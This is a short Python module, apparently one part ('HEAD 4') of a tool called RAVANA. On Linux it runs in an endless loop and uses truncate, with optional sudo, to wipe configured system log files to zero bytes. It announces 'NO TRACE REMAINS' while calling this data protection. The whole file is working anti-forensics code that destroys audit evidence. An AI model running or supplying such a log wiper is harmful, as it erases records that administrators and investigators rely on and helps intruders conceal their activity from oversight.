import subprocess
import time
import config
from ravana_platform import is_windows, with_optional_sudo


def scrub_logs():
    print("[RAVANA] 🧹 HEAD 4: SCRUBBING SYSTEM LOGS...")
    if is_windows():
        print("[RAVANA] HEAD 4: Windows detected — skipping Linux log scrub.")
        return
    for target in config.LOG_SCRUB_TARGETS:
        try:
            subprocess.run(with_optional_sudo(["truncate", "-s", "0", target]), check=True, timeout=10)
            print(f"[RAVANA] Zeroed: {target}")
        except subprocess.CalledProcessError:
            print(f"[RAVANA] ⚠️  HEAD 4: Could not zero {target} — insufficient permissions.")
        except FileNotFoundError:
            print(f"[RAVANA] ⚠️  HEAD 4: 'truncate' not found — skipping {target}.")
    print("[RAVANA] ✅ HEAD 4: DATA PROTECTION SECURED — NO TRACE REMAINS.")


if __name__ == "__main__":
    while True:
        scrub_logs()
        time.sleep(config.LOG_SCRUB_INTERVAL)
